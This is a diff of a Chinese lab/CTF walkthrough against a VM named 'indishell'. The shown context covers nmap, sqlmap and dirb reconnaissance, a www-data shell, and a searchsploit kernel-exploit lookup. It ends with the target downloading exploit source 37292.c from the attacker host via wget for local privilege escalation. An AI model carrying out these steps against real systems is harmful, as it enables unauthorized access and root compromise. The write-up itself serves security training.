@@ -18,7 +18,7 @@
 
 `ifconfig` 获取攻击机的 ip 为 `10.0.2.3`，使用 `nmap` 扫描 ip：
 
-```yacas
+```
 > nmap -sn 10.0.2.0/24
 Starting Nmap 7.95 ( nmap.org ) at 2025-10-21 08:42 CST
 Nmap scan report for bogon (10.0.2.1)
@@ -37,7 +37,7 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 2.94 seconds
 
 考虑靶机 ip 为 `10.0.2.5`，继续扫描端口 `nmap -sV -sC 10.0.2.5`，看看有哪些服务项
 
-```yacas
+```
 > nmap -sV -sC 10.0.2.5
 Starting Nmap 7.95 ( nmap.org ) at 2025-10-21 08:42 CST
 Nmap scan report for bogon (10.0.2.5)
@@ -77,7 +77,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
 
 发现需要账号和密码，sqlmap 扫不到注入点，但是此处 “Show me your SQLI skills” 说明应该有注入点；随意输入账号密码登录，抓包内容也没什么线索
 
-```yacas
+```
 > sqlmap -u 10.0.2.5 --forms --crawl=2 --risk=2 --level=3
 // 最终 sqlmap 的结果
 [09:43:21] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
@@ -87,7 +87,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
 
 决定用 `dirb` 扫一下，扫出来东西不少，以下是精简后的内容：
 
-```yacas
+```
 dirb http://10.0.2.5 /usr/share/dirb/wordlists/big.txt
 -----------------
 DIRB v2.22    
@@ -157,6 +157,10 @@ DOWNLOADED: 61374 - FOUND: 37
 > 10.0.2.5/index
 >
 > 默认的登录网站，我真的不相信没有 SQL 注入点
+
+> 10.0.2.5/c
+> 
+> 神秘
 
 ##### /add 子页面
 
@@ -287,7 +291,7 @@ $cfg['Servers'][$i]['bs_temp_log_threshold'] = '32M';
 
 在 phpMyAdmin 上登录失败，考虑到还开放了 SSH 服务，于是在 SSH 上尝试：
 
-```yacas
+```
 > ssh root@10.0.2.5
 root@10.0.2.5's password: 
 Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-32-generic i686)
@@ -471,7 +475,7 @@ www-data@indishell:/var/www$
 
 > 其实 phpinfo 页面已经有了这些信息，我忘记了
 
-```yacas
+```
 www-data@indishell:$ lsb_release -a
 lsb_release -a
 No LSB modules are available.
@@ -487,7 +491,7 @@ Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UT
 
 获取版本为 Ubuntu 12.04.5 LTS，内核为 Linux 3.13.0，`searchsploit` 搜一下：
 
-```yacas
+```
 > searchsploit Ubuntu 12.04.5        ✔  23:55:11   
 -------------------------------- ---------------------------------
  Exploit Title                  |  Path
@@ -517,7 +521,7 @@ Shellcodes: No Results
 
 攻击机上 http 上传一份代码，靶机上接收编译运行：
 
-```yacas
+```
 www-data@indishell:/$ cd /tmp
 cd /tmp
 www-data@indishell:/tmp$ wget 10.0.2.3:1145/37292.c
